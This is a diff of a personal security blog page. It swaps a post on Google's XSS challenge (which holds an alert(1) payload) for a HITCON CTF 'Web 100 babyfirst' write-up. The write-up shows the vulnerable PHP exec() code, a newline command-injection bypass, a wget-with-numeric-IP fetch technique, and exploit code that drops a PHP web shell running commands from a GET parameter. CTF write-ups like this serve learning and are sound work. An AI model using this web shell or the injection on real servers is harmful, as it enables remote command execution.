@@ -17,9 +17,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="The official blog of I4INFO, Knowledge for the better future!">
 
-    <title>Xss is old but gold! - I4INFO</title>
+    <title>Web 100 baby first - I4INFO</title>
 
-    <link rel="canonical" href="http://i4info.in//2015/09/13/web-security/">
+    <link rel="canonical" href="http://i4info.in//2015/10/20/hitconweb100/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -85,16 +85,16 @@
 
 
     <!-- Post Header -->
-<header class="intro-header" style="background-image: url('/img/post-bg-02.jpg')">
+<header class="intro-header" style="background-image: url('/img/post-bg-02.png')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="post-heading">
-                    <h1>Xss is old but gold!</h1>
+                    <h1>Web 100 baby first</h1>
                     
-                    <h2 class="subheading">Google xss challenge!</h2>
+                    <h2 class="subheading">Hitcon Ctf</h2>
                     
-                    <span class="meta">Posted by Heeraj on September 13, 2015</span>
+                    <span class="meta">Posted by Heeraj on October 20, 2015</span>
                 </div>
             </div>
         </div>
@@ -114,30 +114,49 @@
 <script>
 (adsbygoogle = window.adsbygoogle || []).push({});
 </script></p>
-<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> Want to be a member of our team, contact us! </p>
+<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>
 
-<p>Xss - cross site scripting, may be an old security bug but what it can do is even dangerous in todays senario.</p>
+<p>This CTF challenges were very cool, I liked the challenges. I would like write today on web 100 , baby first challenge. I spend most of my time solving this  challenge, but I didn't get it.</p>
 
-<p>Its intresting if someone is wants to learn xss. Its a good chance now the google is hosting xss challenge by them.
-One xss bug in google can give you $7500. </p>
+<p>Source Code:<br />
+&#x3C;?php<br />
+    highlight_file(__FILE__);<br />
+    $dir = &#x27;sandbox/&#x27; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];<br />
+    if ( !file_exists($dir) )<br />
+        mkdir($dir);<br />
+    chdir($dir);<br />
+<br />
+    $args = $_GET[&#x27;args&#x27;];<br />
+    for ( $i=0; $i&#x3C;count($args); $i++ ){<br />
+        if ( !preg_match(&#x27;/^\w+$/&#x27;, $args[$i]) )<br />
+            exit();<br />
+    }<br />
+    exec(&#x22;/bin/orange &#x22; . implode(&#x22; &#x22;, $args));<br />
+?&#x3E;<br />
 
-<blockquote>" I may be an alert() , when I will be a big bang! "</blockquote>
+<p>During CTF, when I got the problem source code was visible due to the "highlight_file" function in php. After that it had function to make the directory. Butwhen I deployed the challenge, there was no directory created. </p>
 
-<p>The challenge is available in <a href="https://xss-game.appspot.com/level2">xss-game</a> hosted by google.<p>
+<p>The argument were passed through the GET parameter, then there is for loop which loops till count of arguments. Everything was "0k" till now, exept the preg_match() which was filtering only the letters, characters and digits. This was a tension, I have to somehow bypass the preg_match() function.</p>
 
-<p>It would be an intresting challenge to solve . I will come up will the solution in my next blog.<p>
+<p>Ya this was hard phase, because after this function you have exec() which executes the command. But in the case here, there is /bin/orange , I don't know what was orange  anyway. I was think to use &amp;&amp; or ; but that would not work.</p>
 
-<p>The solution for the first blog is quite simple</p>
+<p>For bypassing this function, we have to pass the argument as args[]=a%0A&amp;args[]=touch&amp;args[]=i4info. So now the problem was, what to do next? You can neither use dot or anyother command which would help us. But only thing we could do was , we have to use wget command but for that also, you would have give an IP addrss which don't contain dot. That's intresting an IP without dots.</p>
 
-<blockquote>&#x3C;srcipt&#x3E;alert(1)&#x3C;/script&#x3E;</blockquote>
+<p>This was totally new concept, we have to use something called resolving ip. Thus we can make the ip to long number format. Thus we can execute the wget command. You could do this all in folder such that you can make it a tar and execute php of the tar, anyway php will be executed. The exploit to be taken while wget is given below. Its really superb problem, the way of thinking that we take is very nice.</p>
 
-<p>Stay tuned!<br /> Untill we come with our another blog!</p>
+<p>Exploit:<br />
+&#x3C;?php<br />
+file_put_contents(&#x27;shell.php&#x27;, &#x27;<br />
+    &#x3C;?php<br />
+    header(&#x22;Content-Type: text/plain&#x22;);<br />
+    print shell_exec($_GET[&#x22;cmd&#x22;]);<br />
+    ?&#x3E;<br />
+&#x27;);<br />
+?&#x3E;<br />
+</p>
 
-
-
-
-
-</p></p></p></p>
+<p>Thank you for reading the blog! </p>
+</p>
 
 
                 <hr>
@@ -145,12 +164,12 @@ One xss bug in google can give you $7500. </p>
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2015/09/13/test-post/" data-toggle="tooltip" data-placement="top" title="Must read blogs for web security researchers!">&larr; Previous Post</a>
+                        <a href="/2015/10/15/php/" data-toggle="tooltip" data-placement="top" title="Php comparison operator">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2015/10/04/DCTF/" data-toggle="tooltip" data-placement="top" title="Dctf Ctf">Next Post &rarr;</a>
+                        <a href="/2015/10/23/hacklu/" data-toggle="tooltip" data-placement="top" title="Web 100 Hack lu">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
